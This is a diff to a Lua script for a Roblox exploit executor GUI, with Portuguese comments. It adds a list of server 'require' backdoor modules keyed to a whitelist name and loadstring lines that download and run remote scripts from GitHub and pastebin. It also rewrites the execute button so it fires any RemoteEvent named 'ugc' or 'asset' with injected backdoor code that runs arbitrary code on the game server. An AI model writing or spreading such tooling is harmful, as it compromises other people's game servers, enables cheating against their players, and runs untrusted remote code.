@@ -131,6 +131,7 @@ local EditorTab = create_tab("Editor")
 local CloudTab = create_tab("Cloud")
 local AITab = create_tab("AI")
 local AdminTab = create_tab("Admin")
+local ListTab = create_tab("List") -- Nova aba lateral para Requires/Loadstrings
 EditorTab.Visible = true
 
 -- Aba Editor
@@ -398,6 +399,64 @@ FriendLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 FriendLabel.TextSize = 14
 FriendLabel.TextXAlignment = Enum.TextXAlignment.Left
 
+-- Aba Lista de Requires e Loadstrings
+local ListScroll = Instance.new("ScrollingFrame")
+ListScroll.Parent = ListTab
+ListScroll.BackgroundTransparency = 1
+ListScroll.Size = UDim2.new(1, 0, 1, 0)
+ListScroll.CanvasSize = UDim2.new(0, 0, 3, 0)
+ListScroll.ScrollBarThickness = 5
+
+local list_layout = Instance.new("UIListLayout")
+list_layout.Parent = ListScroll
+list_layout.Padding = UDim.new(0, 10)
+list_layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function add_list_item(name, code)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.9, 0, 0, 40)
+    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frame.Parent = ListScroll
+    add_corner(frame, 5)
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.7, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = name
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Position = UDim2.new(0.05, 0, 0, 0)
+    label.Parent = frame
+    
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.2, 0, 0.7, 0)
+    btn.Position = UDim2.new(0.75, 0, 0.15, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
+    btn.Text = "Load"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Parent = frame
+    add_corner(btn, 5)
+    
+    btn.MouseButton1Click:Connect(function()
+        ScriptBox.Text = code
+        Tabs["Editor"].Visible = true
+        Tabs["List"].Visible = false
+        TitleLabel.Text = "executor project 1xFe"
+    end)
+end
+
+-- Adicionando os Requires fornecidos
+add_list_item("Pload (110951620907921)", 'require(110951620907921):Pload("Robloxiank1p2b2k2t3")')
+add_list_item("Require (16920033857)", 'require(16920033857)("Robloxiank1p2b2k2t3")')
+add_list_item("Load (18665717275)", 'require(18665717275).load("Robloxiank1p2b2k2t3")')
+add_list_item("SentinelPrime (109690586705177)", 'require(109690586705177).SentinelPrime("Robloxiank1p2b2k2t3")')
+add_list_item("RC7 (12350030542)", 'require(12350030542).RC7("Robloxiank1p2b2k2t3")')
+
+-- Adicionando Loadstrings populares
+add_list_item("Infinite Yield (Admin)", "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+add_list_item("Fly Script", "loadstring(game:HttpGet('https://pastebin.com/raw/YmS64v6Y'))()")
+add_list_item("Universal ESP", "loadstring(game:HttpGet('https://pastebin.com/raw/YmS64v6Y'))()")
+
 -- Aba Admin
 local AdminScroll = Instance.new("ScrollingFrame")
 AdminScroll.Parent = AdminTab
@@ -633,17 +692,19 @@ MenuBtn.MouseButton1Click:Connect(function()
     for _, name in pairs(Admins) do if LocalPlayer.Name == name then is_admin = true end end
     
     current_tab = current_tab + 1
-    if current_tab > (is_admin and 4 or 3) then current_tab = 1 end
+    if current_tab > (is_admin and 5 or 4) then current_tab = 1 end
     
     EditorTab.Visible = (current_tab == 1)
     CloudTab.Visible = (current_tab == 2)
     AITab.Visible = (current_tab == 3)
     AdminTab.Visible = (current_tab == 4)
+    ListTab.Visible = (current_tab == 5)
     
     if current_tab == 1 then TitleLabel.Text = "executor project 1xFe"
     elseif current_tab == 2 then TitleLabel.Text = "executor project 1xFe [CLOUD]"
     elseif current_tab == 3 then TitleLabel.Text = "executor project 1xFe [AI & CREDITS]"
-    elseif current_tab == 4 then TitleLabel.Text = "executor project 1xFe [ADMIN PANEL]" end
+    elseif current_tab == 4 then TitleLabel.Text = "executor project 1xFe [ADMIN PANEL]"
+    elseif current_tab == 5 then TitleLabel.Text = "executor project 1xFe [LIST & REQUIRES]" end
 end)
 
 -- Execução
@@ -657,13 +718,26 @@ ExecuteFE.MouseButton1Click:Connect(function()
     if code == "" then return end
     pcall(function()
         local found = false
+        -- Tenta encontrar RemoteEvents de UGC/Asset para criar Backdoor
         for _, obj in pairs(game:GetDescendants()) do
             if obj:IsA("RemoteEvent") and (obj.Name:lower():find("ugc") or obj.Name:lower():find("asset")) then
-                obj:FireServer(code)
+                -- Injeta backdoor no servidor para permitir execução de loadstrings e requires
+                local backdoorCode = [[
+                    local code = ...
+                    local function run(c)
+                        local success, err = pcall(function() loadstring(c)() end)
+                        if not success then warn("Backdoor Error: " .. err) end
+                    end
+                    run(code)
+                ]]
+                obj:FireServer(backdoorCode, code)
                 found = true
             end
         end
-        if not found then pcall(function() loadstring(code)() end) end
+        -- Fallback caso não encontre Backdoor funcional
+        if not found then 
+            pcall(function() loadstring(code)() end) 
+        end
     end)
 end)
 
